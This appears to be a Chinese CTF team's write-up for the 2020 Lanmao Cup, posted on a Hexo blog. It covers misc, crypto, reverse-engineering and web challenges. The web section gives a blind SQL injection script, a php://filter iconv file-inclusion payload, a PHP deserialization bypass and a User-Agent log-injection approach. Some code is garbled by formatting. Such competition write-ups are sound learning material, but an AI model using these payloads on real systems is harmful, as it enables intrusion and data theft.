@@ -1,0 +1,290 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  
+  
+  
+    <meta name="description" content="Lun4R|Nepnep|务农|小菜鸡一枚|ddddhm|又乖又怂.jpg">
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <title>
+    爆炒腰花-蓝帽杯 |
+    
+    sharun&#39;s blogs</title>
+  
+    <link rel="shortcut icon" href="/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<script src="/js/pace.min.js"></script>
+
+<meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="sharun's blogs" type="application/atom+xml">
+</head>
+
+<body>
+<main class="content">
+  <section class="outer">
+  <article id="post-cnblog_13514165" class="article article-type-post" itemscope
+  itemprop="blogPost" data-scroll-reveal>
+
+  <div class="article-inner">
+    
+    <header class="article-header">
+      
+  
+    <h1 class="article-title" itemprop="name">
+      爆炒腰花-蓝帽杯
+    </h1>
+  
+  
+
+
+
+
+    </header>
+    
+
+    
+    <div class="article-meta">
+      <a href="/2020/08/16/cnblog_13514165/" class="article-date">
+  <time datetime="2020-08-16T04:51:00.000Z" itemprop="datePublished">2020-08-16</time>
+</a>
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E7%AC%94%E8%AE%B0/">笔记</a>
+  </div>
+
+    </div>
+    
+
+    
+    
+<div class="tocbot"></div>
+
+    
+
+    <div class="article-entry" itemprop="articleBody">
+      
+
+
+      
+
+      
+      <h1 id="这是👉爆炒腰花-蓝帽杯👈的摘要"><a href="#这是👉爆炒腰花-蓝帽杯👈的摘要" class="headerlink" title="这是👉爆炒腰花-蓝帽杯👈的摘要"></a><a href="../../../../2020/08/16/cnblog_13514165/">这是👉爆炒腰花-蓝帽杯👈的摘要</a></h1><a id="more"></a>
+<p>我们队所有做出的题解都放出来了，本来想先研究python那题再发的。。结果没出来 一家人整整齐齐 &amp; 二进制爷爷，一题进复赛 # 签到<br>gif分解帧，再看不同色域通道。得到flag # sudo 做对九宫格3次，在github上找到了九宫格算法 <code>plain import numpy as np from pwn import * import time def solve(m): if isinstance(m, list): m = np.array(m) elif isinstance(m, str): m = np.loadtxt(m, dtype=np.int, delimiter=&quot;,&quot;) rg = np.arange(m.shape[0]+1) while True: mt = m.copy() while True: d = [] d_len = [] for i in range(m.shape[0]): for j in range(m.shape[1]): if mt[i, j] == 0: possibles = np.setdiff1d(rg, np.union1d(np.union1d(mt[i, :], mt[:, j]), mt[3*(i//3):3*(i//3+1), 3*(j//3):3*(j//3+1)])) d.append([i, j, possibles]) d_len.append(len(possibles)) if len(d) == 0: break idx = np.argmin(d_len) i, j, p = d[idx] if len(p) &gt; 0: num = np.random.choice(p) else: break mt[i, j] = num if len(d) == 0: break if np.all(mt != 0): break print(&quot;\nTrail:\n&quot;, mt) return mt def lllllll(): str1=p.recvline() str1+=p.recvline() str1+=p.recvline() str1+=p.recvline() str1+=p.recvline() str1+=p.recvline() str1+=p.recvline() str1+=p.recvline() str1+=p.recvline() p.recvline() p.recvline() print(str1) dataline = [] data = str1.split(&quot;\n&quot;) # print(data) for a in data: pp = a.split(&quot; &quot;) # print(pp) pp.remove(&#39;&#39;) #print(pp) if (pp != []): for i in range(0, 9): if (pp[i] == &#39;#&#39;): #print(pp[i]) pp[i] = &#39;0&#39; pp[i] = int(pp[i]) # print(pp) dataline.append(pp) print(dataline) result=solve(dataline) s=&#39;&#39; #solve = solve.tostring() for i in range(0,9): for j in range(0,9): s+=str(int(result[i][j])) #print(solve[i][j]), print(s) p.sendline(s) str1=&#39;&#39; time.sleep(3) if __name__ == &quot;__main__&quot;: p=remote(&quot;47.93.204.245&quot;,&quot;12000&quot;) i=0 while(i&lt;3): lllllll() i+=1 p.interactive() </code> # 熟悉的解密 base64隐写和tea算法 <code>plain import re path = &#39;./1.txt&#39; b64char = &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#39; with open(path, &#39;r&#39;)as f: cipher = [i.strip() for i in f.readlines()] plaintext = &#39;&#39; for i in cipher: if i[-2] == &#39;=&#39;: # There are 4-bit hidden info while end with two &#39;=&#39; bin_message = bin(b64char.index(i[-3]))[2:].zfill(4) plaintext += bin_message[-4:] elif i[-1] == &#39;=&#39;: # There are 2-bit hidden info while end with one &#39;=&#39; bin_message = bin(b64char.index(i[-2]))[2:].zfill(2) plaintext += bin_message[-2:] plaintext = re.findall(&#39;.&#123;8&#125;&#39;, plaintext) # 8bits/group plaintext = &#39;&#39;.join([chr(int(i,2)) for i in plaintext]) print plaintext </code> ```plain #include  #include  //加密函数 void encrypt(uint32_t* v,<br>uint32_t* k) { uint32_t v0 = v[0], v1 = v[1], sum = 0, i; /* set up <em>/<br>uint32_t delta = 0x9e3779b9; /</em> a key schedule constant <em>/ uint32_t k0 = k[0],<br>k1 = k[1], k2 = k[2], k3 = k[3]; /</em> cache key <em>/ for (i = 0; i &lt; 32; i++) { /</em><br>basic cycle start */ sum += delta; v0 += ((v1 &lt;&lt; 4) + k0) ^ (v1 + sum) ^ ((v1</p>
+<blockquote>
+<blockquote>
+<ol start="5">
+<li><ul>
+<li>k1); v1 += ((v0 &lt;&lt; 4) + k2) ^ (v0 + sum) ^ ((v0 &gt;&gt; 5) + k3); } /* end<br>cycle <em>/ v[0] = v0; v[1] = v1; } //解密函数 void decrypt(uint32_t</em> v, uint32_t* k)<br>{ uint32_t v0 = v[0], v1 = v[1], sum = 0xC6EF3720, i; /* set up <em>/ uint32_t<br>delta = 0x9e3779b9; /</em> a key schedule constant <em>/ uint32_t k0 = k[0], k1 =<br>k[1], k2 = k[2], k3 = k[3]; /</em> cache key <em>/ for (i = 0; i &lt; 32; i++) { /*<br>basic cycle start */ v1 -= ((v0 &lt;&lt; 4) + k2) ^ (v0 + sum) ^ ((v0 &gt;&gt; 5) + k3);<br>v0 -= ((v1 &lt;&lt; 4) + k0) ^ (v1 + sum) ^ ((v1 &gt;&gt; 5) + k1); sum -= delta; } /</em> end<br>cycle */ v[0] = v0; v[1] = v1; } int main() { //#cipher = [[4018289233L,<br>2950320151L], //[1771827478L, 493980876L], [1863284879L, 1137797599L],<br>//[2759701525L, 3957885055L], [2600866805L, 78850724L]] uint32_t v[2] = {<br>4018289233,2950320151}, //这里要两对两对的做 k[4] = { 11,22,33,44 }; decrypt(v, k); //<br>v为要加密的数据是两个32位无符号整数 // k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位 printf(“解密后的数据：%x%x\n”,<br>v[0], v[1]); return 0; } <code># WEB部分 ## easiestSQLI 测试一下发现是数字型的，过滤了空格，用括号替换一下，然后逐个测试字符即可</code>plain import requests import string<br>import re r = requests.session() url =<br>‘<a target="_blank" rel="noopener" href="http://eci-2ze2wcynh47kqz8clurh.cloudeci1.ichunqiu.com//?id=(mid((select(flag)from(flag)),%7B0%7D,1)=char(%7B1%7D))&#39;">http://eci-2ze2wcynh47kqz8clurh.cloudeci1.ichunqiu.com//?id=(mid((select(flag)from(flag)),{0},1)=char({1}))&#39;</a><br>strings = string.printable for i in range(42): k = i + 1 for c in strings: res<br>= r.get(url.format(k,ord(j))) if re.findall(r’YES~’,res.content.decode()):<br>print(c,end=’’) break ``` ## 文件包含绕过<br>利用伪协议，发现一般的过滤器没有办法，然后找了一下php://filter的其他操作，发现可以用这个协议来获取字符，得到的结果每两个逆序一下即可<br>payload：<br>?filename=php://filter/convert.iconv.faUCS-2LE.UCS-2BE/resource=flag.php ##<br>Soitgoes 文件包含拿一下源码 类文件在try.php里面，传参点在index，发现类中的属性有随机生成的并进行比较，利用引用赋值绕过。</li>
+</ul>
+</li>
+</ol>
+</blockquote>
+</blockquote>
+<pre><code class="plain">$this-&gt;alize-&gt;getFlag(); &#125; &#125; class Flag&#123; public $f; public $t1; public $t2;
+function __construct($file)&#123; echo &quot;Another construction!!&quot;; $this-&gt;f = $file;
+$this-&gt;t1 = $this-&gt;t2 = md5(rand(1,10000)); &#125; public function getFlag()&#123;
+$this-&gt;t2 = md5(rand(1,10000)); echo $this-&gt;t1; echo $this-&gt;t2; if($this-&gt;t1
+=== $this-&gt;t2) &#123; if(isset($this-&gt;f))&#123; echo @highlight_file($this-&gt;f,true); &#125; &#125;
+&#125; &#125; $b=new Flag(&#39;flag.php&#39;); $b-&gt;t1=&amp;$b-&gt;t2; $a=new Seri($b);
+echo(serialize($a)); ?&gt; ```
+![图片](https://uploader.shimo.im/f/sXG0FyVO2rzOMR2P.png!thumbnail) ## inclusion
+考点是参数注入，下面是接替思路 根据提示.index.php.swp获取源码，审计一下 发现X-Forwarded-For头可以作为文件夹名称，这参数点可控
+关键代码 ```plain file_put_contents(&#39;res&#39;,print_r($_SERVER,true)); ```
+发现可以利用日志执行/get_flag,本地调试发现可以返回一系列信息，选择User-agent进行注入
+![图片](https://uploader.shimo.im/f/5p7kA3Giyn9ReCnC.png!thumbnail) # 逆向
+RE是些什么神仙题啊 js那个好像是KCTF的原题 已经恢复OPCODE了但是时间不够了，还有一个是迷宫问题？ 就做了个APK而且困难重重，我直接裂开
+夜神模拟器跑一下 ![图片](https://uploader.shimo.im/f/d9e7AcH8AqlzdefP.png!thumbnail)
+首先先查一下看是不是有壳加固
+![图片](https://uploader.shimo.im/f/gvJA5bmUo6vKVitd.png!thumbnail) 好像没有 用 jadx
+分析一波 ![图片](https://uploader.shimo.im/f/yP9ySOjuHXDaZnTN.png!thumbnail)
+![图片](https://uploader.shimo.im/f/MJzW0iln4fAEFz7A.png!thumbnail) 大致看了一下abc
+三个函数无非是HEx转化啥的 system.out.println打印出的结果也是加密的
+9SKj8BfvJD5PcdH+Rh7TIbXwgpC/Nntiq62rWUEaAzQ3ZyVFG4mLoY0l1xOeMkus 这时就卡住了
+然后看了一会PWN 发现不会又回来了 之前做网鼎杯还是啥我记得有一个加密函数在NATIVE层的 用JEB导出libnative.so然后用IDA分析
+![图片](https://uploader.shimo.im/f/Rc0GmWmRMMTIyNts.png!thumbnail) 细心搜索发现关键函数
+![图片](https://uploader.shimo.im/f/UoZyLShNtXsXT6Ry.png!thumbnail)
+![图片](https://uploader.shimo.im/f/VR7NIkr0DAkt1Hga.png!thumbnail) 看了一下a 函数
+好像是生成二叉树，我数据结构都快忘了，又花了一些时间复习。。或许这就是菜鸡吧 之后进行中序遍历和后序遍历，比对两个字符串，如果正确，先序遍历应该就是flag
+已知中序遍历结果和后续遍历 参考
+[https://blog.csdn.net/BigData_Mining/article/details/81076069](https://blog.csdn.net/BigData_Mining/article/details/81076069)
+00235CFPaeefijlmnrwz 020C5PaeeFlmnjzwrif3 算出前续遍历 3020fF5CeaPeirjnmlwz 我太菜了
+这题花了太多时间 quickjs 那题已经参考KCTF那题还原opcode了 没时间了 QAQ # ZUC
+安装gmssl一把梭，就出一个简单cry是看不起cry吗？
+![图片](https://uploader.shimo.im/f/nfprRv9ZwbMs2oG6.png!thumbnail)
+
+</code></pre>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://sharun.xyz/2020/08/16/cnblog_13514165/" data-id="ckhagon5400262d3q094c6g4j" class="article-share-link">
+        Share
+      </a>
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%8D%9A%E5%AE%A2%E5%9B%AD/" rel="tag">博客园</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%90%AC%E5%AE%B6/" rel="tag">搬家</a></li></ul>
+
+    </footer>
+
+  </div>
+
+  
+  
+  <nav class="article-nav">
+    
+      <a href="/2020/08/16/cnblog_13514707/" class="article-nav-link">
+        <strong class="article-nav-caption">Newer</strong>
+        <div class="article-nav-title">
+          
+            HWS选拔赛-MISC
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2020/07/26/cnblog_13381598/" class="article-nav-link">
+        <strong class="article-nav-caption">Older</strong>
+        <div class="article-nav-title">Lun4R-CyBRICSCTF wp</div>
+      </a>
+    
+  </nav>
+
+
+  
+
+  
+  
+  
+  
+
+</article>
+</section>
+  <footer class="footer">
+  <div class="outer">
+    <div class="float-right">
+      <ul class="list-inline">
+  
+    <li><i class="fe fe-smile-alt"></i> <span id="busuanzi_value_site_uv"></span></li>
+  
+    <li><i class="fe fe-bookmark"></i> <span id="busuanzi_value_page_pv"></span></li>
+  
+</ul>
+    </div>
+    <ul class="list-inline">
+      <li>&copy; 2020 sharun&#39;s blogs</li>
+      <li>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></li>
+      <li>Theme  <a target="_blank" rel="noopener" href="https://github.com/zhwangart/hexo-theme-ocean">Ocean</a></li>
+    </ul>
+  </div>
+</footer>
+
+</main>
+<aside class="sidebar">
+  <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+    <div class="logo">
+      <a href="/"><img src="/images/hexo.svg" alt="sharun&#39;s blogs"></a>
+    </div>
+  
+  <ul class="nav nav-main">
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/">Home</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/archives">Archives</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/gallery">Gallery</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/about">About</a>
+      </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link nav-item-search" title="Search">
+        <i class="fe fe-search"></i>
+        Search
+      </a>
+    </li>
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      <div class="totop" id="totop">
+  <i class="fe fe-rocket"></i>
+</div>
+    </li>
+    <li class="nav-item">
+      
+        <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+          <i class="fe fe-feed"></i>
+        </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+</aside>
+
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+  
+<script src="/js/tocbot.min.js"></script>
+
+  <script>
+    // Tocbot_v4.7.0  http://tscanlin.github.io/tocbot/
+    tocbot.init({
+      tocSelector: '.tocbot',
+      contentSelector: '.article-entry',
+      headingSelector: 'h1, h2, h3, h4, h5, h6',
+      hasInnerContainers: true,
+      scrollSmooth: true,
+      positionFixedSelector: '.tocbot',
+      positionFixedClass: 'is-position-fixed',
+      fixedSidebarOffset: 'auto',
+    });
+  </script>
+
+
+
+<script src="/js/ocean.js"></script>
+
+
+</body>
+</html>
